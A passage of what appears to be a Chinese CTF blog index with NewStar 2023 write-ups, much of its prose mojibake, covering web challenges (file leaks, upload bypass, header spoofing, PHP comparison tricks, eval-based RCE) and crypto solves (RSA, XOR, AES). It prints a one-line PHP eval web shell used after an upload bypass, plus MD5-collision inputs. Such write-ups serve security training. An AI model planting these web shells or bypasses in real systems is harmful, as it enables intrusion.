1)\nn = 113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969\nc = 43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649\n# ç§é’¥d\nd = gmpy2.invert(e, eular)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m).decode('utf-8', errors='ignore'))\n# print(long_to_bytes(m).decode('latin-1', errors='ignore'))\n# print(long_to_bytes(m).decode('gbk', errors='ignore'))\n```\n\nå¾—åˆ°å‰åŠæ®µflagï¼š`flag{two_cloab`\n\næ¥ç€md5è§£å¯†ï¼ŒååŠæ®µï¼š`cse_t0_fact0r}`\n\n### partial decrypt\n\né¢˜ç›®ï¼š\n\n```python\nfrom secret import flag\nfrom Crypto.Util.number import *\n\nm = bytes_to_long(flag)\ne = 65537\np = getPrime(512)\nq = getPrime(512)\n\nn = p*q \n\nc = pow(m,e,n)\n\ndp = inverse(e, (p-1))\ndq = inverse(e, (q-1))\nm1 = pow(c,dp, p)\nm2 = pow(c,dq, q)\nq_inv = inverse(q, p)\nh = (q_inv*(m1-m2)) % p\nprint('m2 =', m2)\nprint('h =', h)\nprint('q =', q)\n\n# m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884\n# h = 4180720137090447835816240697100630525624574275\n# q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931\n```\n\nè¿™æ˜¯å…³äºRSA-CRT(ä¸­å›½å‰©ä½™å®šç†)\n\n```python\nfrom Crypto.Util.number import *\n\nm2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884\nh = 4180720137090447835816240697100630525624574275\nq = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931\n\nm = m2+h*q\nprint(long_to_bytes(m))\n```\n\n![image-20231025151826920](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025151826920.png)\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"NewStar 2023 Week1","url":"/NewStar-2023/","content":"\n# NewStar WriteUp Week1\n\n## web\n\n### æ³„éœ²çš„ç§˜å¯†\n\n![image-20230925142322020](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142322020.png)\n\nçœ‹åˆ°é¢˜ç›® é¦–å…ˆæƒ³åˆ° ä¿¡æ¯æ³„éœ²ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼šæƒ³åˆ° phpinfo.php test.php .... \n\nâ€‹\t\t\tæœ€ååˆ°`robots.txt` å¾—åˆ°ä¸€åŠflagï¼š\n\n![image-20230925142512313](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142512313.png)\n\n`PART ONE: flag{r0bots_1s_s0_us3ful`\n\n`www.zip:` \n\n![image-20230925154247859](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925154247859.png)\n\n`$PART_TWO = \"_4nd_www.zip_1s_s0_d4ng3rous}\";`\n\n```php\n<?php\n$PART_TWO = \"_4nd_www.zip_1s_s0_d4ng3rous}\";\necho \"<h1>ç²—å¿ƒçš„ç®¡ç†å‘˜æ³„æ¼äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–æ³„æ¼çš„ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯ï¼</h1>\";\n```\n\n### Begin of Upload\n\n![image-20230925152823289](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152823289.png)\n\nå…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç®€å•çš„å°è¯•ä¸€ä¸‹ï¼š\n\nåˆ©ç”¨bpæŠ“åŒ… ä¿®æ”¹åç¼€ä»¥åŠæ·»åŠ ä¸€å¥è¯phpåé—¨ä»£ç ï¼š` <?php @eval($_POST['111111']);?>`\n\n![image-20230925152958967](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152958967.png)\n\nä¸Šä¼ æˆåŠŸ åˆ©ç”¨èšå‰‘è¿æ¥\n\n![image-20230925153150350](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925153150350.png)\n\nå‘ç°flag`flag{ba65aadc-84ca-4ece-9a14-fadf4362f3c3}`\n\n### ErrorFlask\n\næ‰“å¼€é¶æœºæ˜¾ç¤ºï¼š\n\n![image-20230925214243591](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214243591.png)\n\nå…ˆåˆ©ç”¨æŠ“åŒ… ç®€å•æ„é€ number1å’Œnumber2ï¼š\n\n![image-20230925214220089](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214220089.png)\n\nä¸æ˜¯sstiæ¨¡ç‰ˆæ³¨å…¥ï¼Œæƒ³åˆ°æ˜¯æ•´å‹æ•°å­—å¯ä»¥æ­£å¸¸å¾—å‡ºç»“æœï¼Œå‡å¦‚æ˜¯å­—ç¬¦ä¼šå¾—å‡ºä»€ä¹ˆï¼š\n\n![image-20230925214419173](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214419173.png)\n\né¡µé¢500 æœç´¢flag å¾—åˆ°`flag{Y0u_@re_3enset1ve_4bout_deb8g}`\n\n### Begin of HTTP\n\n1. é¦–å…ˆæ‰“å¼€ç›®æ ‡é¶æœº\n\n   ![image-20230926095210963](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095210963.png)\n\n2. å‘ç°å¯èƒ½é¦–å…ˆæ¶‰åŠçš„æ˜¯getæ–¹å¼ä¼ å‚æ•° `ctf`ï¼Œåˆ©ç”¨æŠ“åŒ…çœ‹çœ‹æ•ˆæœ\n\n   ![image-20230926095403902](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095403902.png)\n\n3. é¡µé¢ç»™å‡ºæç¤º ï¼Œåç»­éœ€è¦åˆ©ç”¨POSTè¯·æ±‚ç»™`secret`ä¼ å€¼ï¼Œä½†æ˜¯å…·ä½“ä¼ ä»€ä¹ˆè¿˜ä¸çŸ¥é“ï¼Œé¦–å…ˆæŸ¥çœ‹æºä»£ç \n\n   ![image-20230926095521717](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095521717.png)\n\n4. å‘ç°äº†å°ä¸œè¥¿ï¼š`<!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->` åˆ©ç”¨base64è§£å¯†å¾—åˆ°ï¼š`n3wst4rCTF2023g00000d`\n\n   ![image-20230926095636943](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095636943.png)\n\n5. è¿›è¡Œpostä¼ å€¼`secret=n3wst4rCTF2023g00000d`\n\n   ![image-20230926095957929](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095957929.png)\n\n6. æˆåŠŸä¼ å€¼åç»™å‡ºä¸‹ä¸€æ­¥æç¤ºï¼šå‘ç°cookieä¸­å­˜åœ¨`power` äºæ˜¯å°†powerä¿®æ”¹ä¸º`ctfer`\n\n   ![image-20230926100128656](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100128656.png)\n\n7. ä¸‹ä¸€æ­¥æç¤ºéœ€è¦ä¿®æ”¹æµè§ˆå™¨ï¼Œå³æ˜¯ä¿®æ”¹UA  `User-Agent: NewStarCTF2023`\n\n   ![image-20230926100330339](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100330339.png)\n\n8. ç»§ç»­è·Ÿç€æç¤ºä¿®æ”¹`Referer: newstarctf.com` \n\n   ![image-20230926100426655](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100426655.png)\n\n9. æœ¬æ¥ä»¥ä¸ºç»“æŸäº†ï¼Œæ—¢ç„¶è¿˜æœ‰ï¼Œé™åˆ¶åªå…è®¸æœ¬åœ°ç”¨æˆ·ï¼Œé¦–å…ˆæƒ³åˆ°`X-Forwarded-For`ï¼Œä½†æ˜¯å°è¯•äº†`X-Forwarded-For:127.0.0.1`æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œç»§ç»­æŸ¥é˜…ç›¸å…³httpçš„èµ„æ–™å‘ç° `x-real-ip`ä¹Ÿèƒ½é™åˆ¶æœ¬åœ°ç”¨æˆ·\n\n   ![image-20230926100815968](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100815968.png)\n\n10. å¾—åˆ°flagï¼š`flag{17b2edf3-a19b-4e8f-8639-cb2c5edb7000}`\n\næ•´ä¸ªé¢˜çš„æ€è·¯è¿˜æ˜¯å¾ˆç®€å•ï¼Œåªéœ€è¦è·Ÿç€é¢˜ç›®çš„æç¤ºæ¥è§£å†³å°±è¡Œï¼Œä¸»è¦æ˜¯è¦äº†è§£httpçš„ç›¸å…³çŸ¥è¯†ã€‚\n\n### Begin of PHP\n\n1. é¦–å…ˆæ‰“å¼€é¶æœºçœ‹åˆ°phpä»£ç ï¼š\n\n   ```php\n    <?php\n   error_reporting(0);\n   highlight_file(__FILE__);\n   \n   if(isset($_GET['key1']) && isset($_GET['key2'])){\n       echo \"=Level 1=<br>\";\n       if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){\n           $flag1 = True;\n       }else{\n           die(\"nope,this is level 1\");\n       }\n   }\n   \n   if($flag1){\n       echo \"=Level 2=<br>\";\n       if(isset($_POST['key3'])){\n           if(md5($_POST['key3']) === sha1($_POST['key3'])){\n               $flag2 = True;\n           }\n       }else{\n           die(\"nope,this is level 2\");\n       }\n   }\n   \n   if($flag2){\n       echo \"=Level 3=<br>\";\n       if(isset($_GET['key4'])){\n           if(strcmp($_GET['key4'],file_get_contents(\"/flag\")) == 0){\n               $flag3 = True;\n           }else{\n               die(\"nope,this is level 3\");\n           }\n       }\n   }\n   \n   if($flag3){\n       echo \"=Level 4=<br>\";\n       if(isset($_GET['key5'])){\n           if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){\n               $flag4 = True;\n           }else{\n               die(\"nope,this is level 4\");\n           }\n       }\n   }\n   \n   if($flag4){\n       echo \"=Level 5=<br>\";\n       extract($_POST);\n       foreach($_POST as $var){\n           if(preg_match(\"/[a-zA-Z0-9]/\",$var)){\n               die(\"nope,this is level 5\");\n           }\n       }\n       if($flag5){\n           echo file_get_contents(\"/flag\");\n       }else{\n           die(\"nope,this is level 5\");\n       }\n   } \n   ```\n\n   \n\n2. è¿›è¡Œä»£ç å®¡è®¡ï¼Œå‘ç°å¤§æ¦‚æ€è·¯æ˜¯é¦–å…ˆè¾“å…¥`key1`å’Œ`key2`æ»¡è¶³ä¸¤ä¸ªè¾“å…¥çš„å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒå¾—åˆ°flag1 æ¥ç€æ»¡è¶³å…¶ä»–æ¡ä»¶ä¾æ¬¡å¾—åˆ°flag2ï¼Œflag3ï¼Œflag4ï¼Œç”±flag5å¾—åˆ°flag\n\n3. é¦–å…ˆæ‰¾åˆ°`key1`å’Œ`key2`æ»¡è¶³ä¸¤ä¸ªè¾“å…¥çš„å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒ\n\n   ```bash\n   key1= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B\n   \n   key2= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B\n   ```\n\n   ![image-20230926124224070](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124224070.png)\n\n4. æ ¹æ®æç¤ºå·²ç»è¿›å…¥level 2 æ­¤æ—¶è¦æ»¡è¶³`md5($_POST['key3']) === sha1($_POST['key3']`\n\n   åƒè¿™æ ·çš„å¼ºæ¯”è¾ƒï¼Œä¼ å…¥çš„ä¸æ˜¯å­—ç¬¦ä¸²è€Œæ˜¯æ•°ç»„ï¼Œä¸ä½†**md5() å’Œ sha1()å‡½æ•°**ä¸ä¼šæŠ¥é”™ï¼Œç»“æœè¿˜ä¼šè¿”å›**null**ï¼Œåœ¨å¼ºæ¯”è¾ƒé‡Œé¢**null=null**ä¸ºtrueç»•è¿‡\n\n   ![image-20230926124757524](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124757524.png)\n\n5. æ­¤æ—¶å·²ç»æ˜¾ç¤ºè¿›å…¥level 3 ï¼Œæ¥ç€æ»¡è¶³`strcmp($_GET['key4'],file_get_contents(\"/flag\")`\n\n   strcmp çš„å‚æ•°åªèƒ½æ˜¯ å­—ç¬¦ä¸²ï¼Œå½“æˆ‘ä»¬ä¼ å…¥æ•°ç»„æ—¶å°±ä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨çš„æ˜¯==ï¼ŒNULL==0æ˜¯ bool(true)çš„\n\n   ![image-20230926125029145](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125029145.png)\n\n6. ç°åœ¨è¿›å…¥level 4ï¼Œç°åœ¨éœ€è¦æ»¡è¶³`!is_numeric($_GET['key5']) && $_GET['key5'] > 2023`\n\n   ![image-20230926125148090](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125148090.png)\n\n7. æœ€ååˆ°è¾¾level 5ï¼Œæ ¹æ®\n\n   ```php\n   \textract($_POST);\n       foreach($_POST as $var){\n           if(preg_match(\"/[a-zA-Z0-9]/\",$var)){\n               die(\"nope,this is level 5\");\n           }\n       }\n       if($flag5){\n           echo file_get_contents(\"/flag\");\n       }\n   ```\n\n   é¦–å…ˆè¦è¿‡æ»¤preg_matchï¼Œæ¥ç€è¦æ„é€ flag5\n\n   **å»ºè®®ï¼šå½“åˆä¸æ˜¯å¾ˆæ˜ç™½ï¼Œåˆ©ç”¨phpstudyæ„é€ æ­¤é¡µé¢è¿›è¡Œæµ‹è¯•**\n\n   ```php\n   if($flag4){\n       echo \"=Level 5=<br>\";\n       extract($_POST);\n       print_r($_POST);\n       foreach($_POST as $var){\n           print_r($var);\n           if(preg_match(\"/[a-zA-Z0-9]/\",$var)){\n               die(\"nope,this is level 5-1\");\n           }\n       }\n       if($flag5){\n           echo \"hello\";\n           echo file_get_contents(\"/flag\");\n       }else{\n           die(\"nope,this is level 5-2\");\n       }\n   } \n   ```\n\n   ![image-20230926125720157](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125720157.png)\n\n   ç»•è¿‡`preg_match`,é€šè¿‡`%00``%5c`ç»•è¿‡\n\n   ![image-20230926125430120](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125430120.png)\n\n8. æœ€åå¾—åˆ°flagï¼š`flag{de665d4c-3bbd-44e8-8eba-2b6cfeef881a}`\n\n### R!C!E!\n\n![image-20230926205925939](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926205925939.png)\n\n1. é¦–å…ˆè§‚å¯Ÿç»™å‡ºçš„phpä»£ç ï¼š\n\n   ```php\n    <?php\n   highlight_file(__FILE__);\n   if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){\n       $password=md5($_POST['password']);\n       $code=$_POST['e_v.a.l'];\n       if(substr($password,0,6)===\"c4d038\"){\n           if(!preg_match(\"/flag|system|pass|cat|ls/i\",$code)){\n               eval($code);\n           }\n       }\n   } \n   ```\n\n2. å®¡æŸ¥ä»£ç å¾—çŸ¥ï¼šéœ€è¦é€šè¿‡POSTä¼ å‚`password`å’Œ`e_v.a.l` \n\n   md5ç¢°æ’å¾—åˆ°ï¼š114514çš„md5å€¼å‰6ä¸ºæ˜¯`c4d038`\n\n   ![image-20230926211145829](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211145829.png)\n\n   æ¶‰åŠåˆ°RCEç»•è¿‡ï¼šé€šé…ç¬¦ç»•è¿‡ï¼Œå†…æ•›æ‰§è¡Œ\n\n   ![image-20230926211050969](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211050969.png)\n\n## crypto\n\n### brainfuck\n\n`++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.>-----.<<<-.>>++..<.>.++++++.....------.<.>.<<<<<+++.>>>>+.<<<+++++++.>>>+.<<<-------.>>>-.<<<+.+++++++.--..>>>>---.-.<<<<-.+++.>>>>.<<<<-------.+.>>>>>++.`\n\nbrainfuckåœ¨çº¿è§£å¯†ï¼š\n\n![image-20230925144213246](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144213246.png)\n\n`flag{Oiiaioooooiai#b7c0b1866fe58e12}`\n\n### Caesar's Secert\n\n`kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}`\n\nå‡¯æ’’å¯†ç è§£å¯†ï¼š\n\n![image-20230925144342795](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144342795.png)\n\n### Fence\n\n`fa{ereigtepanet6680}lgrodrn_h_litx#8fc3`\n\næ …æ å¯†ç è§£å¯†ï¼š\n\n![image-20230925144031722](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144031722.png)\n\n`flag{reordering_the_plaintext#686f8c03}`\n\n\n\n### babyrsa\n\n#### RSAç®—æ³•\n\n> RSAç®—æ³•ç”±ä¸¤ä¸ªå¯†é’¥ï¼Œå³å…¬é’¥å’Œç§é’¥ç»„æˆã€‚\n> â€‚â€‚â€‚â€‚1ï¼‰å‡†å¤‡ä¸¤ä¸ªéå¸¸å¤§çš„ç´ æ•° på’Œ q ï¼ˆè½¬æ¢æˆäºŒè¿›åˆ¶å 1024ä¸ªäºŒè¿›åˆ¶ä½æˆ–è€…æ›´å¤šï¼Œä½æ•°è¶Šå¤šè¶Šéš¾ç ´è§£ï¼‰ï¼›\n> â€‚â€‚â€‚â€‚2ï¼‰åˆ©ç”¨å­—ç¬¦ä¸²æ¨¡æ‹Ÿè®¡ç®—å¤§ç´ æ•° p å’Œ q çš„ä¹˜ç§¯ m=pqï¼›\n> â€‚â€‚â€‚â€‚3ï¼‰åŒæ ·æ–¹æ³•è®¡ç®—m=(p-1)(q-1) ï¼Œè¿™é‡Œçš„ mæ˜¯ n çš„æ¬§æ‹‰å‡½æ•°ï¼›\n> â€‚â€‚â€‚â€‚4ï¼‰æ‰¾åˆ°ä¸€ä¸ªæ•°e (1<e<m)æ»¡è¶³ gcd(m,e)=1ï¼ˆå³ e å’Œ m äº’ç´ ï¼‰ï¼›\n> â€‚â€‚â€‚â€‚5ï¼‰è®¡ç®— e åœ¨æ¨¡ m åŸŸä¸Šçš„é€†å…ƒd ï¼ˆå³æ»¡è¶³ed mod m =1 ï¼‰ï¼›\n> â€‚â€‚â€‚â€‚6ï¼‰è‡³æ­¤ï¼Œå…¬é’¥å’Œç§é’¥ç”Ÿæˆå®Œæ¯•ï¼š (n,e)ä¸ºå…¬é’¥ï¼Œ (n,d)ä¸ºç§é’¥ï¼›\n\n**åŠ å¯†ï¼š**â€‚å¯¹äºæ˜æ–‡xï¼Œç”¨å…¬é’¥ (n,e)å¯¹ x åŠ å¯†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯å°† x è½¬æ¢æˆæ•°å­—ï¼ˆå­—ç¬¦ä¸²çš„è¯å–å…¶ ASCIIç æˆ–è€… unicode å€¼ï¼‰ï¼Œç„¶åé€šè¿‡å¹‚å–æ¨¡è®¡ç®—å‡ºy ï¼Œå…¶ä¸­ yå°±æ˜¯å¯†æ–‡ï¼›\n\n![image-20230927095332177](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095332177.png)\n\n**è§£å¯†ï¼š**å¯¹äºå¯†æ–‡y ï¼Œç”¨ç§é’¥ (n,d) å¯¹ y è¿›è¡Œè§£å¯†çš„è¿‡ç¨‹å’ŒåŠ å¯†ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯è®¡ç®—å¹‚å–æ¨¡ï¼›\n\n![image-20230927095404116](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095404116.png)\n\n****\n\n```python\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef gen_prime(n):\n    res = 1\n\n    for i in range(15):\n        res *= getPrime(n)\n\n    return res\n\n\nif __name__ == '__main__':\n    n = gen_prime(32)\n    e = 65537\n    m = bytes_to_long(flag)\n    c = pow(m,e,n)\n    print(n)\n    print(c)\n# 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261\n# 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595\n```\n\nç»è¿‡å¤§ç´ æ•°åˆ†è§£ï¼š`17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261`\n\nèƒ½åˆ†è§£æˆï¼š\n\n```bash\n 2217990919<10> \n 2338725373<10> \n 2370292207<10> \n 2463878387<10> \n 2706073949<10> \n 2794985117<10> \n 2804303069<10> \n 2923072267<10> \n 2970591037<10> \n 3207148519<10> \n 3654864131<10> \n 3831680819<10> \n 3939901243<10> \n 4093178561<10> \n 4278428893<10>\n```\n\næ ¹æ®ç»™å‡ºçš„æ–‡ä»¶ å†™å‡ºè§£ç è„šæœ¬ï¼š\n\n```python\nimport gmpy2\nfrom Crypto.Util.number import *\n\n# å…¬é’¥e\ne = 65537\n\n# æ¬§æ‹‰å‡½æ•°eular euler = (p - 1) * (q - 1)\nnum = [2217990919, 2338725373, 2370292207, 2463878387,2706073949, 2794985117, 2804303069, 2923072267,\n       2970591037, 3207148519, 3654864131, 3831680819,3939901243, 4093178561, 4278428893]\neular = 1\nfor i in num:\n    eular = eular * (i - 1)\n# print(eular)\n\nn = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261\nc = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595\n# ç§é’¥d\nd = gmpy2.invert(e, eular)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m).decode('utf-8', errors='ignore'))\n```\n\n### babyencoding\n\n```bash\npart 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=\npart 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=\npart 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S<R-C`Q9F8S87T`\n```\n\nçœ‹åˆ°é¢˜ç›® å¾—çŸ¥ï¼šflagç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ \n\n1. `part 1 of flagï¼š`**base64**  flag{dazzling_encoding#4e0ad4\n\n2. `part 2 of flag:`**base32**   f0ca08d1e1d0f10c0c7afe422fea7\n\n3. `part 3 of flag: `**UUencode**  c55192c992036ef623372601ff3a}\n\n> flag: flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}\n\n****\n\n\n\n#### UUencode\n\nâ€‹\t**ç®€è¿°ï¼š**\n\nâ€‹\tUUencodeæ˜¯ä¸€ç§äºŒè¿›åˆ¶åˆ°æ–‡å­—çš„ç¼–ç ï¼Œæœ€æ—©åœ¨unixé‚®ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œå…¨ç§°ï¼šUnix-to-Unix  encodingï¼ŒUUencodeå°†è¾“å…¥æ–‡æœ¬ä»¥æ¯ä¸‰ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ï¼Œå¦‚æœæœ€åå‰©ä¸‹çš„èµ„æ–™å°‘äºä¸‰ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿçš„éƒ¨ä»½ç”¨é›¶è¡¥é½ã€‚ä¸‰ä¸ªå­—èŠ‚å…±æœ‰24ä¸ªBitï¼Œä»¥6-bitä¸ºå•ä½åˆ†ä¸º4ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä»¥åè¿›åˆ¶æ¥è¡¨ç¤ºæ‰€å‡ºç°çš„å­—èŠ‚çš„æ•°å€¼ã€‚è¿™ä¸ªæ•°å€¼åªä¼šè½åœ¨0åˆ°63ä¹‹é—´ã€‚ç„¶åå°†æ¯ä¸ªæ•°åŠ ä¸Š32ï¼Œæ‰€äº§ç”Ÿçš„ç»“æœåˆšå¥½è½åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯æ‰“å°å­—ç¬¦ï¼ˆ32-ç©ºç™½â€¦95-åº•çº¿ï¼‰çš„èŒƒå›´ä¹‹ä¸­ã€‚\n\nâ€‹\t**ä¸¾ä¾‹ï¼š**\n\n```bash\næ˜æ–‡ï¼šhello,world.\nå¯†æ–‡ï¼š,:&5L;&\\L=V]R;&0N\n```\n\nâ€‹\t**åœ¨çº¿è§£å¯†&å·¥å…·**ï¼š\n\nhttp://www.hiencode.com/uu.html\n\n### babyxor\n\né¢˜ç›®ï¼š\n\n```python\nfrom secret import *\n\nciphertext = []\nflag = 'e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2'\nfor f in flag:\n    ciphertext.append(f ^ key)\n\nprint(bytes(ciphertext).hex())\n# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2\n```\n\nè§£å¯†è„šæœ¬\n\n```python\nfrom pwn import xor\n\nciphertext = bytes.fromhex('e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2')\n\nfor i in range(256):\n    if b'flag' in xor(bytes([i]), ciphertext):\n        print(xor(bytes([i]), ciphertext))\n```\n\n### babyaes\n\né¢˜ç›®ï¼š\n\n```python\nfrom Crypto.Cipher import AES\nimport os\n# from flag import flag\nfrom Crypto.Util.number import *\n\n\ndef pad(data):\n    return data + b\"\".join([b'\\x00' for _ in range(0, 16 - len(data))])\n\n\ndef main():\n    flag_ = pad(flag)\n    key = os.urandom(16) * 2\n    iv = os.urandom(16)\n    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    enc_flag = aes.encrypt(flag_)\n    print(enc_flag)\n\n\nif __name__ == \"__main__\":\n    main()\n# 3657491768215750635844958060963805125333761387746954618540958489914964573229\n# b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'\n```\n\nè§£é¢˜aesï¼Œæˆ‘ä»¬éœ€è¦`å¯†ç key`ï¼Œ`åç§»é‡iv`ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼ŒåŠ å¯†æ¨¡å¼æ˜¯`AES-CBC`\n\n```python\nfrom Crypto.Cipher import AES\nimport os\n# from flag import flag\nfrom Crypto.Util.number import *\n\n\ndef main():\n    xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229 ^ 1\n    print(xor)\n    out = long_to_bytes(xor)\n    key = out[:16] * 2\n    print(key)\n    iv = bytes_to_long(key[16:]) ^ bytes_to_long(out[16:])\n    iv = long_to_bytes(iv)\n    print(iv)\n    ciphertext = b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    flag = cipher.decrypt(ciphertext)\n    print(flag)\n\n\nif __name__ == \"__main__\":\n    main()\n# 3657491768215750635844958060963805125333761387746954618540958489914964573229\n# 